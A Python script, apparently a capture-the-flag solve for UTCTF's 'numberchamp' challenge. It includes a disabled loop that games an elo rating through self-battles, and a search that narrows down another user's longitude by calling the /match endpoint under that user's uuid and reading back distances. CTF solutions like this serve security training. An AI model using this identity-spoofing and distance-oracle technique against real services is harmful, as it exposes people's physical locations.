import requests
from time import sleep

match_path = 'https://numberchamp-challenge.utctf.live/match'
battle_path = 'https://numberchamp-challenge.utctf.live/battle'
headers = {
    "Accept": "application/json",
    "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
    "Cache-Control": "no-cache",
    "Origin": "https://numberchamp-challenge.utctf.live",
    "Pragma": "no-cache",
    "Priority": "u=1, i",
    "Referer": "https://numberchamp-challenge.utctf.live/",
    "Sec-Ch-Ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
}

uuid = 'e16e0122-86bb-4422-a244-c24343e9ff7d'
number = -1
latlng = [36.0218624, 129.3123584]

while False:
    try:
        match_res = requests.post(
            match_path,
            headers=headers,
            params={
                'uuid': uuid,
                'lat': latlng[0],
                'lon': latlng[1]
            }
        )
        match_res = match_res.json()
    except:
        print(match_res.text)
        break

    
    if match_res['elo'] == 3000:
        print(match_res)
        break
    
    print(match_res)

    opponent = match_res['uuid']
    try:
        battle_res = requests.post(
            battle_path,
            headers=headers,
            params={
                'uuid': uuid,
                'opponent': uuid,
                'number': number
            }
        )
        battle_res = battle_res.json()
    except:
        print(battle_res.text)
        break

    print(battle_res)
    print()
    sleep(1)

match_res = {'distance': 6815.600826213392, 'elo': 3000, 'user': 'geopy', 'uuid': 'd0f627bc-ac15-4d45-8e08-73ee3b5fd06c'}
master_uuid = match_res['uuid']
mn, mx = 80, 90
lat = 39.94042
numer = 1
for _ in range(15):
    res = []
    mn_d, index = 100000, mn
    for coord in range(mn, mx):
        lng = coord / numer
        lng *= -1
        match_res = requests.post(
            match_path,
            headers=headers,
            params={
                'uuid': master_uuid,
                'lat': lat,
                'lon': lng
            }
        )
        match_res = match_res.json()
        print(lat, lng, match_res)
        res.append((lat, lng, match_res['distance']))

        D = match_res['distance']
        if mn_d > D:
            mn_d, index = D, coord
    
    mn, mx = index * 10, (index + 1) * 10
    numer *= 10
    sleep(2)